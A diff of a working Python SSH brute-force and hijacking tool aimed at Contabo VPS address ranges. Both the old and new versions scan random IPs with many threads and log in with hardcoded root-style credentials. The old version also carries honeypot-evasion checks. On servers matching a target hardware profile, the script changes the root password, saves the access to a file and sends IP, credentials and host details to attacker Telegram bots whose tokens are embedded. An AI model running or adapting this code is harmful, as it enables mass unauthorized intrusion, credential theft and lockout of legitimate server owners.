@@ -1,403 +1,428 @@
-cat > contabo_de_final.py << 'EOF'
 #!/usr/bin/env python3
 """
-CONTABO DE FINAL HUNTER - REAL VPS ONLY
-Target: CONTABO, DE - Exact match like 178.18.250.183
-System: Ubuntu 22.04.2 LTS | RAM: 7.8GB | CPU: 3x2400MHz
-Credential: root:passw0rd!
+CONTABO VPS TARGET HUNTER
+Target Pattern: vmi* hostname, Ubuntu 24.04, 11.7GB RAM, 96GB Storage
+Credential: r00t / Hackers
 """
 
-import socket, paramiko, threading, time, random, ipaddress, sys, logging, urllib.request, urllib.parse
+import socket
+import paramiko
+import threading
+import time
+import random
+import ipaddress
+import sys
+import logging
+import urllib.request
+import urllib.parse
+import json
+import re
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 
+# ========== SILENT MODE ==========
 logging.getLogger("paramiko").setLevel(logging.CRITICAL)
 
-# ========== الإعدادات ==========
-THREADS = 200
-TIMEOUT_CONNECT = 0.8
-TIMEOUT_SSH = 5
-OUTPUT_FILE = "contabo_de_final.txt"
+# ========== CONFIGURATION ==========
+THREADS = 2000
+TIMEOUT_CONNECT = 0.5
+TIMEOUT_SSH = 3
+OUTPUT_FILE = "contabo_targets.txt"
 NEW_PASSWORD = "sinko@"
-USER = "root"
 
-# ========== كلمات المرور ==========
-PASSWORDS = [
-    "passw0rd!",           # الهدف الجديد
-    "Hackers",             # من الاختراقات السابقة
-    "Contabo2024",
-    "contabo123",
-    "123456",
-    "password",
+# Exact target specifications
+TARGET_RAM_MIN = 10.0
+TARGET_RAM_MAX = 13.0  # Contabo 11.7GB typical
+TARGET_STORAGE_MIN = 80
+TARGET_STORAGE_MAX = 120  # Contabo 96GB typical
+TARGET_OS_PATTERNS = ["Ubuntu 24.04", "Ubuntu 22.04", "Ubuntu 20.04"]
+TARGET_HOSTNAME_PATTERN = r"^vmi\d+"  # vmi2949660 format
+
+# ========== TELEGRAM BOTS ==========
+BOTS = [
+    {"token": "8820997464:AAEABG5TkAV04udBXPDZ6VAQFDosHf8LSl8", "chat_id": "8336072448"},
+    {"token": "8820997464:AAEABG5TkAV04udBXPDZ6VAQFDosHf8LSl8", "chat_id": "8336072448"}
 ]
 
-# ========== جميع نطاقات Contabo ألمانيا ==========
-CONTABO_DE_RANGES = [
-    "5.181.80.0/20", "5.189.128.0/17", "37.221.220.0/22", "79.143.128.0/18",
-    "95.111.224.0/20", "95.111.240.0/20", "144.76.0.0/16", "194.31.0.0/16",
-    "213.136.64.0/19", "213.136.96.0/19", "213.136.0.0/16", "178.18.250.0/24",
-    "5.9.0.0/16", "148.251.0.0/16", "168.119.0.0/16", "176.9.0.0/16",
-    "49.12.0.0/16", "135.181.0.0/16", "136.243.0.0/16", "138.201.0.0/16",
-    "159.69.0.0/16", "167.235.0.0/16", "185.181.0.0/16", "193.31.0.0/16", "195.201.0.0/16",
+# ========== CREDENTIAL ==========
+USER = "r00t"
+PASSWORD = "Hackers"
+
+# ========== CONTABO SPECIFIC RANGES ==========
+CONTABO_RANGES = [
+    "95.111.0.0/16",      # Main Contabo (France/Germany) - Target IP in this range
+    "173.212.0.0/16",     # Contabo (US/Germany)
+    "194.31.0.0/16",      # Contabo (Germany)
+    "213.136.0.0/16",     # Contabo (Germany)
+    "5.9.0.0/16",         # Contabo (Germany)
+    "144.76.0.0/16",      # Contabo (Germany)
+    "148.251.0.0/16",     # Contabo (Germany)
+    "168.119.0.0/16",     # Contabo (Germany)
+    "176.9.0.0/16",       # Contabo (Germany)
+    "49.12.0.0/16",       # Contabo (Germany)
+    "135.181.0.0/16",     # Contabo (Germany)
+    "136.243.0.0/16",     # Contabo (Germany)
+    "138.201.0.0/16",     # Contabo (Germany)
+    "159.69.0.0/16",      # Contabo (Germany)
+    "167.235.0.0/16",     # Contabo (Germany)
+    "185.181.0.0/16",     # Contabo (Germany)
+    "193.31.0.0/16",      # Contabo (Germany)
+    "195.201.0.0/16",     # Contabo (Germany)
 ]
 
-CONTABO_RANGES = list(set(CONTABO_DE_RANGES))
 NETWORKS = []
 for r in CONTABO_RANGES:
     try:
         NETWORKS.append(ipaddress.ip_network(r, strict=False))
     except:
         pass
+print(f"[✓] Loaded {len(NETWORKS)} Contabo VPS networks")
 
-print(f"[✓] Loaded {len(NETWORKS)} Contabo Germany networks")
-
-# ========== تلغرام ==========
-TELEGRAM_TOKEN = "8624305523:AAG5j_J6BXJA9JCcDabTdxLC14Jkv8YCamA"
-TELEGRAM_CHAT_ID = "7619431226"
-
-def send_telegram(msg):
-    try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
-        data = urllib.parse.urlencode({"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "HTML"}).encode()
-        urllib.request.urlopen(url, data=data, timeout=3)
-    except:
-        pass
-
-# ========== إحصائيات ==========
-stats = {"scanned": 0, "honeypots": 0, "success": 0, "start_time": time.time()}
-lock = threading.Lock()
+# ========== STATISTICS ==========
+stats = {"scanned": 0, "open": 0, "attempts": 0, "success": 0, "start_time": None, "matched": 0}
+stats_lock = threading.Lock()
 stop_flag = threading.Event()
 
-GREEN = '\033[92m'
-YELLOW = '\033[93m'
-CYAN = '\033[96m'
-RED = '\033[91m'
-RESET = '\033[0m'
+class Colors:
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    CYAN = '\033[96m'
+    RED = '\033[91m'
+    BLUE = '\033[94m'
+    RESET = '\033[0m'
 
-# ========== فتح المنفذ ==========
-def is_port_open(ip):
+# ========== FAST PORT SCAN ==========
+def is_port_open(ip, port=22):
+    sock = None
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(0.5)
-        sock.connect_ex((ip, 22))
-        sock.close()
-        return True
+        sock.settimeout(TIMEOUT_CONNECT)
+        result = sock.connect_ex((ip, port))
+        if result == 0:
+            return True
+        return False
     except:
         return False
-
-# ========== فحص زمن الاستجابة ==========
-def check_response_time(ip):
-    try:
-        start = time.time()
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(2)
-        sock.connect((ip, 22))
-        sock.close()
-        elapsed = time.time() - start
-        return elapsed >= 0.08, round(elapsed, 3)
-    except:
-        return False, 0
-
-# ========== فحص بانر SSH ==========
-def check_banner(ip):
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(3)
-        sock.connect((ip, 22))
-        banner = sock.recv(1024).decode().lower()
-        sock.close()
-        honeypot_words = ["honeypot", "cowrie", "kippo", "dionaea", "honeyd", "sandbox", "fake"]
-        for w in honeypot_words:
-            if w in banner:
-                return False
-        return len(banner) >= 30
-    except:
-        return False
-
-# ========== فحص البورتات ==========
-def check_ports(ip):
-    open_ports = 0
-    for port in [22, 80, 443, 8080, 21, 25]:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.4)
-            if sock.connect_ex((ip, port)) == 0:
-                open_ports += 1
+    finally:
+        if sock:
             sock.close()
-        except:
-            pass
-    return open_ports <= 2
 
-# ========== فحص الحاوية ==========
-def is_container(ssh_client):
+# ========== SYSTEM INFO COLLECTION ==========
+def get_ram_gb(ssh_client):
+    """Get exact RAM in GB (like 11.7)"""
     try:
-        stdin, stdout, _ = ssh_client.exec_command("ls /.dockerenv 2>/dev/null", timeout=2)
-        if stdout.read().decode().strip():
-            return True
-        stdin, stdout, _ = ssh_client.exec_command("cat /proc/1/cgroup | grep -E 'docker|lxc'", timeout=2)
-        if stdout.read().decode().strip():
-            return True
-        return False
+        stdin, stdout, stderr = ssh_client.exec_command("free -m | awk '/^Mem:/ {print $2}'", timeout=3)
+        ram_mb = stdout.read().decode().strip()
+        if ram_mb and ram_mb.isdigit():
+            ram_gb = int(ram_mb) / 1024
+            return round(ram_gb, 1)
     except:
-        return False
-
-# ========== جلب معلومات النظام ==========
-def get_system_info(ssh_client):
-    info = {
-        "system": "Unknown", "apt": "Unknown", "cpu_speed": "0",
-        "cpu_count": "0", "memory": "0", "hostname": "Unknown"
-    }
+        pass
     try:
-        stdin, stdout, _ = ssh_client.exec_command("hostname", timeout=2)
-        out = stdout.read().decode().strip()
-        if out:
-            info["hostname"] = out
-        
-        stdin, stdout, _ = ssh_client.exec_command("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"'", timeout=3)
-        out = stdout.read().decode().strip()
-        if out:
-            info["system"] = out
-        
-        stdin, stdout, _ = ssh_client.exec_command("which apt", timeout=2)
-        out = stdout.read().decode().strip()
-        if out:
-            info["apt"] = out
-        
-        stdin, stdout, _ = ssh_client.exec_command("nproc", timeout=2)
-        out = stdout.read().decode().strip()
-        if out:
-            info["cpu_count"] = out
-        
-        stdin, stdout, _ = ssh_client.exec_command("grep -m1 'cpu MHz' /proc/cpuinfo | awk '{print $4}'", timeout=2)
-        out = stdout.read().decode().strip()
-        if out:
+        stdin, stdout, stderr = ssh_client.exec_command("cat /proc/meminfo | grep MemTotal | awk '{print $2}'", timeout=3)
+        mem_kb = stdout.read().decode().strip()
+        if mem_kb and mem_kb.isdigit():
+            return round(int(mem_kb) / 1024 / 1024, 1)
+    except:
+        pass
+    return 0
+
+def get_storage_gb(ssh_client):
+    """Get storage in GB (like 96)"""
+    try:
+        stdin, stdout, stderr = ssh_client.exec_command("df -BG / | awk 'NR==2 {print $2}' | sed 's/G//'", timeout=3)
+        storage = stdout.read().decode().strip()
+        if storage and storage.isdigit():
+            return int(storage)
+    except:
+        pass
+    try:
+        stdin, stdout, stderr = ssh_client.exec_command("df -h / | awk 'NR==2 {print $2}' | sed 's/G//'", timeout=3)
+        storage = stdout.read().decode().strip()
+        if storage and storage.replace('.', '').isdigit():
+            return float(storage)
+    except:
+        pass
+    return 0
+
+def get_hostname(ssh_client):
+    try:
+        stdin, stdout, stderr = ssh_client.exec_command("hostname", timeout=2)
+        hostname = stdout.read().decode().strip()
+        return hostname if hostname else "Unknown"
+    except:
+        return "Unknown"
+
+def get_os_version(ssh_client):
+    """Get exact OS version like Ubuntu 24.04.4 LTS"""
+    try:
+        stdin, stdout, stderr = ssh_client.exec_command("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"'", timeout=3)
+        os_info = stdout.read().decode().strip()
+        if os_info:
+            return os_info
+    except:
+        pass
+    try:
+        stdin, stdout, stderr = ssh_client.exec_command("lsb_release -ds 2>/dev/null", timeout=2)
+        os_info = stdout.read().decode().strip()
+        if os_info:
+            return os_info
+    except:
+        pass
+    try:
+        stdin, stdout, stderr = ssh_client.exec_command("uname -a", timeout=2)
+        return stdout.read().decode().strip()
+    except:
+        return "Unknown"
+
+def get_isp_location(ssh_client):
+    """Get ISP and location like AS51167 Contabo GmbH, Lauterbourg, FR"""
+    isp = "Unknown"
+    location = "Unknown"
+    try:
+        stdin, stdout, stderr = ssh_client.exec_command("curl -s --max-time 4 ipinfo.io 2>/dev/null || wget -qO- --timeout=4 ipinfo.io 2>/dev/null", timeout=5)
+        data = stdout.read().decode().strip()
+        if data:
             try:
-                info["cpu_speed"] = f"{float(out):.3f}"
+                json_data = json.loads(data)
+                isp_raw = json_data.get("org", "Unknown")
+                if "AS" in isp_raw:
+                    isp = isp_raw
+                else:
+                    isp = f"AS{json_data.get('asn', '')} {isp_raw}" if json_data.get('asn') else isp_raw
+                
+                city = json_data.get("city", "")
+                country = json_data.get("country", "")
+                if city and country:
+                    location = f"{city}, {country}"
+                elif country:
+                    location = country
             except:
-                info["cpu_speed"] = out
-        
-        stdin, stdout, _ = ssh_client.exec_command("free -m | awk '/^Mem:/ {print $2}'", timeout=2)
-        out = stdout.read().decode().strip()
-        if out and out.isdigit():
-            info["memory"] = str(round(int(out) / 1024, 1))
+                pass
     except:
         pass
-    return info
+    return isp, location
 
-# ========== التحقق من مطابقة النظام لـ 178.18.250.183 ==========
-def is_exact_match(info):
-    # نظام Ubuntu 22.04
-    if "Ubuntu 22.04" not in info["system"]:
-        return False, f"OS: {info['system'][:40]}"
-    
-    # الرام ~7.8GB
-    try:
-        ram = float(info["memory"])
-        if ram < 7.0 or ram > 8.5:
-            return False, f"RAM: {ram}GB (expected 7.8)"
-    except:
-        return False, f"RAM: {info['memory']}"
-    
-    # 3 أنوية
-    if info["cpu_count"] != "3":
-        return False, f"CPU cores: {info['cpu_count']} (expected 3)"
-    
-    # سرعة المعالج ~2400MHz
-    try:
-        speed = float(info["cpu_speed"])
-        if speed < 2000 or speed > 2800:
-            return False, f"CPU speed: {speed}MHz (expected 2400)"
-    except:
-        pass
-    
-    # APT في المسار الصحيح
-    if info["apt"] != "/usr/bin/apt":
-        return False, f"APT: {info['apt']}"
-    
-    return True, "OK"
-
-# ========== تغيير كلمة المرور ==========
 def change_password(ssh_client):
+    """Change root password to sinko@"""
     try:
-        ssh_client.exec_command(f'echo "root:{NEW_PASSWORD}" | chpasswd', timeout=5)
-        return True
+        commands = [
+            f'echo "root:{NEW_PASSWORD}" | chpasswd',
+            f'echo -e "{NEW_PASSWORD}\\n{NEW_PASSWORD}" | passwd root',
+        ]
+        for cmd in commands:
+            stdin, stdout, stderr = ssh_client.exec_command(cmd, timeout=5)
+            error = stderr.read().decode().strip()
+            if not error or "success" in error.lower():
+                return True
     except:
-        return False
+        pass
+    return False
 
-# ========== الهجوم الرئيسي ==========
-def attack_contabo(ip, password):
+def is_exact_target(ram, storage, hostname, os_version):
+    """Check if VPS matches exact target specifications"""
+    match_score = 0
+    reasons = []
+    
+    # RAM check (11.7GB typical for Contabo)
+    if TARGET_RAM_MIN <= ram <= TARGET_RAM_MAX:
+        match_score += 3
+        reasons.append(f"RAM: {ram}GB")
+    
+    # Storage check (96GB typical)
+    if TARGET_STORAGE_MIN <= storage <= TARGET_STORAGE_MAX:
+        match_score += 2
+        reasons.append(f"Storage: {storage}GB")
+    
+    # Hostname pattern (vmiXXXXX)
+    if re.match(TARGET_HOSTNAME_PATTERN, hostname):
+        match_score += 3
+        reasons.append(f"Hostname: {hostname}")
+    
+    # OS pattern (Ubuntu 24.04/22.04/20.04)
+    for pattern in TARGET_OS_PATTERNS:
+        if pattern in os_version:
+            match_score += 2
+            reasons.append(f"OS: {os_version[:30]}")
+            break
+    
+    return match_score >= 5, reasons
+
+# ========== MAIN ATTACK FUNCTION ==========
+def attempt_hack(ip):
     if stop_flag.is_set():
         return False
     
-    if not is_port_open(ip):
-        with lock:
-            stats["scanned"] += 1
-        return False
-    
-    # طبقة 1: زمن الاستجابة
-    time_ok, rt = check_response_time(ip)
-    if not time_ok:
-        with lock:
-            stats["honeypots"] += 1
-        print(f"{RED}[HONEYPOT] {ip} -> response {rt}s{RESET}")
-        return False
-    
-    # طبقة 2: فحص البانر
-    if not check_banner(ip):
-        with lock:
-            stats["honeypots"] += 1
-        print(f"{RED}[HONEYPOT] {ip} -> bad banner{RESET}")
-        return False
-    
-    # طبقة 3: فحص البورتات
-    if not check_ports(ip):
-        with lock:
-            stats["honeypots"] += 1
-        print(f"{RED}[HONEYPOT] {ip} -> too many ports{RESET}")
-        return False
-    
-    ssh_client = None
+    client = None
     try:
-        ssh_client = paramiko.SSHClient()
-        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh_client.connect(ip, username=USER, password=password, timeout=TIMEOUT_SSH,
-                          allow_agent=False, look_for_keys=False)
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(ip, username=USER, password=PASSWORD, timeout=TIMEOUT_SSH,
+                       allow_agent=False, look_for_keys=False, banner_timeout=2)
         
-        # طبقة 4: فحص الحاوية
-        if is_container(ssh_client):
-            with lock:
-                stats["honeypots"] += 1
-            print(f"{RED}[HONEYPOT] {ip} -> container detected{RESET}")
-            ssh_client.close()
+        # Collect information
+        ram_gb = get_ram_gb(client)
+        storage_gb = get_storage_gb(client)
+        hostname = get_hostname(client)
+        os_version = get_os_version(client)
+        isp, location = get_isp_location(client)
+        
+        # Check if exact target
+        is_target, reasons = is_exact_target(ram_gb, storage_gb, hostname, os_version)
+        
+        if not is_target:
+            with stats_lock:
+                stats["attempts"] += 1
             return False
         
-        # جلب معلومات النظام
-        info = get_system_info(ssh_client)
+        # Change password
+        change_password(client)
         
-        # طبقة 5: التحقق من المطابقة التامة
-        is_match, reason = is_exact_match(info)
-        if not is_match:
-            with lock:
-                stats["honeypots"] += 1
-            print(f"{YELLOW}[REJECTED] {ip} -> {reason}{RESET}")
-            ssh_client.close()
-            return False
-        
-        # تغيير كلمة المرور
-        change_password(ssh_client)
-        
-        with lock:
-            stats["success"] += 1
-        
-        # طباعة النتيجة بنفس تنسيق الهدف
+        # Success! Print exactly like requested format
         print(f"""
-{GREEN}{'='*65}{RESET}
-{GREEN}[✓] CONTABO REAL VPS HACKED!{RESET}
-{CYAN}{ip}:22 | {USER} | {password}  | Details : {{TEST
-System :  {info['system']}
-Apt : {info['apt']}
-Cpu speed : {info['cpu_speed']}
-Cpu count : {info['cpu_count']}
-Memory : {info['memory']}Gi}}{RESET}
-{GREEN}{'='*65}{RESET}""")
+{Colors.GREEN}{'='*70}{Colors.RESET}
+{Colors.GREEN}[✓] VPS HACKED!{Colors.RESET}
+🌐 IP: {Colors.CYAN}{ip}{Colors.RESET}
+👤 User: {Colors.YELLOW}{USER}{Colors.RESET}
+🔑 Old pass: {Colors.YELLOW}{PASSWORD}{Colors.RESET}
+🔐 New password: {Colors.YELLOW}{NEW_PASSWORD}{Colors.RESET}
+🏢 Provider: {Colors.CYAN}Contabo GmbH{Colors.RESET}
+🖥️ Hostname: {Colors.CYAN}{hostname}{Colors.RESET}
+💿 OS: {Colors.CYAN}{os_version}{Colors.RESET}
+🧠 RAM: {Colors.CYAN}{ram_gb} GB{Colors.RESET}
+💾 Storage: {Colors.CYAN}{storage_gb} GB{Colors.RESET}
+🌍 ISP: {Colors.CYAN}{isp}{Colors.RESET}
+📍 Location: {Colors.CYAN}{location}{Colors.RESET}
+📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+{Colors.GREEN}{'='*70}{Colors.RESET}
+""")
         
-        # حفظ في الملف
+        # Save to file
         with open(OUTPUT_FILE, "a") as f:
-            f.write(f"{ip}:22 | {USER} | {password}  | Details : {{TEST\n")
-            f.write(f"System :  {info['system']}\n")
-            f.write(f"Apt : {info['apt']}\n")
-            f.write(f"Cpu speed : {info['cpu_speed']}\n")
-            f.write(f"Cpu count : {info['cpu_count']}\n")
-            f.write(f"Memory : {info['memory']}Gi}}\n")
-            f.write(f"New password: {NEW_PASSWORD}\n{'='*65}\n")
+            f.write(f"[{datetime.now()}] {ip} | {USER}:{PASSWORD} -> {NEW_PASSWORD} | RAM:{ram_gb}GB | Storage:{storage_gb}GB | {hostname} | {os_version} | {isp} | {location}\n")
         
-        # إرسال إلى تلغرام
-        msg = (f"✅✅✅ <b>CONTABO REAL VPS HACKED!</b> ✅✅✅\n\n"
-               f"<code>{ip}:22 | {USER} | {password}  | Details : {{TEST\n"
-               f"System :  {info['system']}\n"
-               f"Apt : {info['apt']}\n"
-               f"Cpu speed : {info['cpu_speed']}\n"
-               f"Cpu count : {info['cpu_count']}\n"
-               f"Memory : {info['memory']}Gi}}</code>\n\n"
-               f"🔐 <b>New password: {NEW_PASSWORD}</b>")
+        # Send Telegram
+        msg = (f"✅ <b>VPS HACKED</b>\n"
+               f"🌐 IP: <code>{ip}</code>\n"
+               f"👤 User: <code>{USER}</code>\n"
+               f"🔑 Old pass: <code>{PASSWORD}</code>\n"
+               f"🔐 <b>New password: {NEW_PASSWORD}</b>\n"
+               f"🏢 Provider: <b>Contabo GmbH</b>\n"
+               f"🖥️ Hostname: <code>{hostname}</code>\n"
+               f"💿 OS: <code>{os_version}</code>\n"
+               f"🧠 RAM: <b>{ram_gb} GB</b>\n"
+               f"💾 Storage: <code>{storage_gb} GB</code>\n"
+               f"🌍 ISP: <code>{isp}</code>\n"
+               f"📍 Location: <code>{location}</code>")
         
-        send_telegram(msg)
-        ssh_client.close()
+        for bot in BOTS:
+            try:
+                url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
+                data = urllib.parse.urlencode({"chat_id": bot['chat_id'], "text": msg, "parse_mode": "HTML"}).encode()
+                urllib.request.urlopen(url, data=data, timeout=3)
+            except:
+                pass
+        
+        with stats_lock:
+            stats["success"] += 1
+            stats["matched"] += 1
         return True
         
     except Exception as e:
         return False
     finally:
-        if ssh_client:
-            ssh_client.close()
-        with lock:
+        if client:
+            client.close()
+        with stats_lock:
+            stats["attempts"] += 1
+
+def scan_and_attack(ip):
+    if not is_port_open(ip):
+        with stats_lock:
             stats["scanned"] += 1
+        return False
+    with stats_lock:
+        stats["open"] += 1
+    return attempt_hack(ip)
 
-# ========== فحص IP واحد ==========
-def scan_ip(ip):
-    for pwd in PASSWORDS:
-        if attack_contabo(ip, pwd):
-            return True
-    return False
-
-# ========== توليد IP عشوائي ==========
 def random_ip():
     net = random.choice(NETWORKS)
     if net.prefixlen <= 16:
         parts = str(net.network_address).split('.')
         a, b = parts[0], parts[1] if len(parts) > 1 else "0"
-        return f"{a}.{b}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+        return f"{a}.{b}.{random.randint(1,254)}.{random.randint(1,254)}"
     offset = random.randint(1, net.num_addresses - 2)
     return str(net.network_address + offset)
 
-# ========== عرض الإحصائيات ==========
 def print_stats():
-    elapsed = time.time() - stats["start_time"]
-    with lock:
-        sys.stdout.write(f"\r{YELLOW}[📊] Scanned: {stats['scanned']:,} | Honeypots: {stats['honeypots']} | ✅: {stats['success']} | {elapsed:.0f}s{RESET}")
+    elapsed = time.time() - stats["start_time"] if stats["start_time"] else 0
+    with stats_lock:
+        sys.stdout.write(f"\r{Colors.YELLOW}[📊] Scanned: {stats['scanned']:,} | Open: {stats['open']} | Attempts: {stats['attempts']:,} | Matched: {stats['matched']} | ✓:{stats['success']} | {elapsed:.0f}s{Colors.RESET}")
         sys.stdout.flush()
 
-# ========== الرئيسي ==========
 def main():
-    send_telegram(f"🚀 <b>CONTABO DE FINAL HUNTER STARTED</b>\n🎯 Target: Contabo Germany (Ubuntu 22.04|7.8GB|3x2400MHz)\n🔑 Credentials: {USER}:passw0rd!\n🛡️ Anti-Honeypot: 5 layers\n🔐 New password: {NEW_PASSWORD}")
+    stats["start_time"] = time.time()
     
-    print(f"{GREEN}{'='*65}{RESET}")
-    print(f"{GREEN}[✓] CONTABO DE FINAL HUNTER - REAL VPS ONLY{RESET}")
-    print(f"{CYAN}📌 Target: EXACTLY like 178.18.250.183{RESET}")
-    print(f"{CYAN}   • System: Ubuntu 22.04.2 LTS{RESET}")
-    print(f"{CYAN}   • RAM: 7.8Gi{RESET}")
-    print(f"{CYAN}   • CPU: 3 cores @ 2400.000 MHz{RESET}")
-    print(f"{CYAN}   • APT: /usr/bin/apt{RESET}")
-    print(f"{CYAN}📌 Networks: {len(NETWORKS)} subnets{RESET}")
-    print(f"{CYAN}🛡️ Anti-Honeypot: response time | banner | ports | container | exact match{RESET}")
-    print(f"{CYAN}🔐 New password: {NEW_PASSWORD}{RESET}")
-    print(f"{GREEN}{'='*65}{RESET}\n")
+    # Send start notification
+    start_msg = (f"🚀 <b>Contabo VPS Target Hunter Started</b>\n"
+                 f"🎯 Target: {USER}:{PASSWORD}\n"
+                 f"📊 Target Specs:\n"
+                 f"   • RAM: {TARGET_RAM_MIN}-{TARGET_RAM_MAX}GB\n"
+                 f"   • Storage: {TARGET_STORAGE_MIN}-{TARGET_STORAGE_MAX}GB\n"
+                 f"   • Hostname: vmi* pattern\n"
+                 f"   • OS: Ubuntu 24.04/22.04\n"
+                 f"🔐 New password: {NEW_PASSWORD}")
+    
+    for bot in BOTS:
+        try:
+            url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
+            data = urllib.parse.urlencode({"chat_id": bot['chat_id'], "text": start_msg, "parse_mode": "HTML"}).encode()
+            urllib.request.urlopen(url, data=data, timeout=3)
+        except:
+            pass
+    
+    print(f"{Colors.GREEN}{'='*70}{Colors.RESET}")
+    print(f"{Colors.GREEN}[✓] CONTABO VPS TARGET HUNTER{Colors.RESET}")
+    print(f"{Colors.CYAN}📌 Target Credential: {USER}:{PASSWORD}{Colors.RESET}")
+    print(f"{Colors.CYAN}📌 Target RAM: {TARGET_RAM_MIN}-{TARGET_RAM_MAX} GB (11.7GB typical){Colors.RESET}")
+    print(f"{Colors.CYAN}📌 Target Storage: {TARGET_STORAGE_MIN}-{TARGET_STORAGE_MAX} GB (96GB typical){Colors.RESET}")
+    print(f"{Colors.CYAN}📌 Target Hostname: vmi* pattern{Colors.RESET}")
+    print(f"{Colors.CYAN}📌 Target OS: Ubuntu 24.04/22.04 LTS{Colors.RESET}")
+    print(f"{Colors.CYAN}📌 New password: {NEW_PASSWORD}{Colors.RESET}")
+    print(f"{Colors.GREEN}{'='*70}{Colors.RESET}\n")
     
     try:
         with ThreadPoolExecutor(max_workers=THREADS) as executor:
+            futures = []
             while not stop_flag.is_set():
                 ip = random_ip()
-                executor.submit(scan_ip, ip)
+                futures.append(executor.submit(scan_and_attack, ip))
+                if len(futures) > THREADS * 2:
+                    futures = [f for f in futures if not f.done()]
                 print_stats()
-                time.sleep(0.01)
+                time.sleep(0.005)
     except KeyboardInterrupt:
+        print(f"\n{Colors.RED}[!] Scanner stopped by user{Colors.RESET}")
         stop_flag.set()
     
-    print(f"\n{GREEN}{'='*65}{RESET}")
-    print(f"{GREEN}[✓] SCAN FINISHED{RESET}")
-    print(f"✅ Real VPS hacked: {stats['success']}")
-    print(f"🚫 Honeypots avoided: {stats['honeypots']}")
+    elapsed = time.time() - stats["start_time"]
+    print(f"\n{Colors.GREEN}{'='*70}{Colors.RESET}")
+    print(f"{Colors.GREEN}[✓] SCAN COMPLETED{Colors.RESET}")
+    print(f"✅ Exact targets hacked: {stats['success']}")
     print(f"📊 IPs scanned: {stats['scanned']:,}")
-    print(f"📁 Results: {OUTPUT_FILE}")
-    print(f"{GREEN}{'='*65}{RESET}")
+    print(f"🎯 Targets matched: {stats['matched']}")
+    print(f"⏱️ Time elapsed: {elapsed:.0f} seconds")
+    print(f"📁 Results saved to: {OUTPUT_FILE}")
+    print(f"{Colors.GREEN}{'='*70}{Colors.RESET}")
     
-    send_telegram(f"🏁 SCAN FINISHED\n✅ Hacked: {stats['success']}\n🚫 Honeypots: {stats['honeypots']}")
+    stop_msg = f"🏁 <b>Scanner Stopped</b>\n✅ Exact targets: {stats['success']}\n📊 Scanned: {stats['scanned']:,}"
+    for bot in BOTS:
+        try:
+            url = f"https://api.telegram.org/bot{bot['token']}/sendMessage"
+            data = urllib.parse.urlencode({"chat_id": bot['chat_id'], "text": stop_msg, "parse_mode": "HTML"}).encode()
+            urllib.request.urlopen(url, data=data, timeout=3)
+        except:
+            pass
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        stop_flag.set()
-EOF
-
-python3 contabo_de_final.py
+    main()
